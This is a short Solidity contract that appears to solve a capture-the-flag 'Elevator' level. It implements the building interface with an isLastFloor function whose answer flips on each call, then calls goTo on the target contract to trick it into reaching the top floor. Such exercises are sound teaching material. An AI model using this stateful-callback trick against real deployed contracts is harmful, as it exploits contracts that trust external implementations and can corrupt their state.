// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Building as IBuilding, IElevator} from "./Elevator.sol";

contract ElevatorAttack is IBuilding {
  bool private firstPass = true;

  function isLastFloor(uint256) external returns (bool) {
    return firstPass = !firstPass;
  }

  function exploit(address instance) external {
    uint256 max = type(uint256).max;
    IElevator elevator = IElevator(instance);

    elevator.goTo(max);
  }
}
